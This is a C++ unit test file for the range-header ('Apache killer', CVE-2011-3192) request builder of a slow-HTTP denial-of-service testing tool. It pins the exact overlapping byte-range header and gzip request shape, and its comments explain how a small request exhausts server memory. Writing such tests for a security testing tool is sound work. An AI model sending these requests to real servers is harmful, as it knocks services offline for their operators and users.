// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
//
// Unit tests for the range ("Apache killer", CVE-2011-3192) request builder. The
// exact header shape is what a vulnerable server chokes on, so it is pinned here
// against the original tool's generator rather than left to drift.
#include <cstdio>
#include <string>

#include "slowhttp/attacks/range.hpp"
#include "slowhttp/config.hpp"

using slowhttp::Action;
using slowhttp::Config;
using slowhttp::RangeAttack;

static int failures = 0;

static void check(bool cond, const char* what) {
  if (!cond) {
    std::fprintf(stderr, "FAIL: %s\n", what);
    ++failures;
  }
}

static void test_header_shape() {
  // Small limit so the expected string can be written out in full.
  std::string h;
  int n = slowhttp::build_range_header(5, 3, &h);
  check(h == "Range: bytes=0-,5-0,5-1,5-2,5-3\r\n",
        "range header matches the classic generator byte for byte");
  check(n == 5, "counts every spec including the leading 0-");
}

static void test_request() {
  Config cfg;
  cfg.mode = slowhttp::Mode::Range;
  cfg.target.host = "example.test";
  cfg.target.path = "/big.iso";
  cfg.range_start = 5;
  cfg.range_limit = 2000;

  RangeAttack attack(cfg);
  Action a = attack.on_connect(0);
  check(a.kind == Action::Kind::Send, "sends one complete request");
  check(!a.rearm, "no dribble phase: nothing is held back");

  const std::string& req = a.bytes;
  check(req.rfind("HEAD /big.iso HTTP/1.1\r\n", 0) == 0,
        "defaults to HEAD like the classic tool");
  check(req.find("Range: bytes=0-,5-0,5-1,") != std::string::npos,
        "carries the overlapping range set");
  check(req.find("Accept-Encoding: gzip\r\n") != std::string::npos,
        "requests gzip: compressing each range is where the server burns memory");
  check(req.size() >= 4 && req.compare(req.size() - 4, 4, "\r\n\r\n") == 0,
        "request is complete -- this attack is amplification, not a slow hold");
  check(attack.range_count() == 2002, "limit 2000 yields 2002 specs");
  // The whole point is asymmetry: a small request, a huge server-side cost.
  check(attack.request_size() < 32768, "request stays small (kilobytes)");
}

static void test_scaling() {
  Config cfg;
  cfg.mode = slowhttp::Mode::Range;
  cfg.target.host = "h";
  cfg.range_start = 5;
  cfg.range_limit = 10;
  RangeAttack small(cfg);

  cfg.range_limit = 5000;
  RangeAttack big(cfg);

  check(small.range_count() == 12, "-b 10 yields 12 specs");
  check(big.range_count() == 5002, "-b 5000 yields 5002 specs");
  check(big.request_size() > small.request_size(),
        "-b scales the request, and with it the server-side cost");
}

int main() {
  test_header_shape();
  test_request();
  test_scaling();
  if (failures == 0) {
    std::printf("range: all checks passed\n");
    return 0;
  }
  std::fprintf(stderr, "range: %d check(s) failed\n", failures);
  return 1;
}
